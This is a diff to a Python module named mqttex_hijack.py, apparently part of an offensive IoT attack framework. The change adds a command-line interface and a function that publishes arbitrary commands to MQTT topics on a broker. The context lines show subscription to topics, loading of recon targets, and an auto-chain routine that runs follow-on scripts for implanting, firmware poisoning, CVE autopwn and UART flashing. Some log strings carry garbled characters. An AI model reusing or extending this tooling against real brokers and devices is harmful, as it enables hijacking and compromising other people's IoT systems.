@@ -1,6 +1,3 @@
-
-# modules/attacks/mqttex_hijack.py
-
 import paho.mqtt.client as mqtt
 import time
 import json
@@ -11,6 +8,8 @@ import sys
 from pathlib import Path
 from datetime import datetime
 import websocket
+import signal
+import argparse
 
 # Constants
 DEFAULT_BROKER = "broker.hivemq.com"
@@ -33,7 +32,6 @@ os.makedirs("reports", exist_ok=True)
 os.makedirs("webgui", exist_ok=True)
 
 # Globals
-mqtt_messages = []
 payload_export = []
 client = None
 
@@ -43,6 +41,12 @@ def log(msg):
     print(full_msg)
     with open("reports/mqttex_hijack.log", "a") as f:
         f.write(full_msg + "\n")
+
+def graceful_shutdown(sig, frame):
+    log("Interrupt received. Shutting down MQTT client.")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, graceful_shutdown)
 
 def push_alert_websocket(message):
     try:
@@ -91,7 +95,7 @@ def export_payload(topic, payload):
         json.dump(payload_export, f, indent=2)
 
 def auto_chain_attacks():
-    log("Triggering: implant → firmware poison → CVE autopwn → UART flash → report")
+    log("Triggering: implant â firmware poison â CVE autopwn â UART flash â report")
     os.system(f"python3 {CHAIN_SCRIPT_1}")
     time.sleep(2)
     os.system(f"python3 {CHAIN_SCRIPT_2}")
@@ -133,6 +137,13 @@ def get_targets_from_recon():
                 log(f"Failed to load recon targets: {e}")
     return targets
 
+def publish_command(broker, topic, command):
+    mqttc = mqtt.Client()
+    mqttc.connect(broker, DEFAULT_PORT)
+    mqttc.publish(topic, command)
+    log(f"[â] Published '{command}' to topic '{topic}'")
+    mqttc.disconnect()
+
 def start_client(broker, topic):
     userdata = {'topic': topic}
     mqtt_client = mqtt.Client(userdata=userdata)
@@ -146,16 +157,24 @@ def start_client(broker, topic):
         return
 
 def main():
+    parser = argparse.ArgumentParser(description="MQTT Exploit Module")
+    parser.add_argument("--broker", help="MQTT broker address")
+    parser.add_argument("--topic", help="MQTT topic to subscribe")
+    parser.add_argument("--publish", help="Publish a command (one-shot) and exit")
+    args = parser.parse_args()
+
+    broker = args.broker or input(f"MQTT Broker [{DEFAULT_BROKER}]: ") or DEFAULT_BROKER
+    topic = args.topic or input(f"Topic to subscribe [{DEFAULT_TOPIC}]: ") or DEFAULT_TOPIC
+
+    if args.publish:
+        publish_command(broker, topic, args.publish)
+        return
+
     log("Launching MQTT Hijack Module")
     push_alert_file()
     push_alert_websocket("MQTT hijack module started")
     update_killchain("MQTT hijack module launched")
 
-    # Prompt user for broker/topic or use defaults
-    broker = input(f"MQTT Broker [{DEFAULT_BROKER}]: ") or DEFAULT_BROKER
-    topic = input(f"Topic to subscribe [{DEFAULT_TOPIC}]: ") or DEFAULT_TOPIC
-
-    # Optionally print known targets
     targets = get_targets_from_recon()
     if targets:
         log(f"Discovered targets: {targets}")
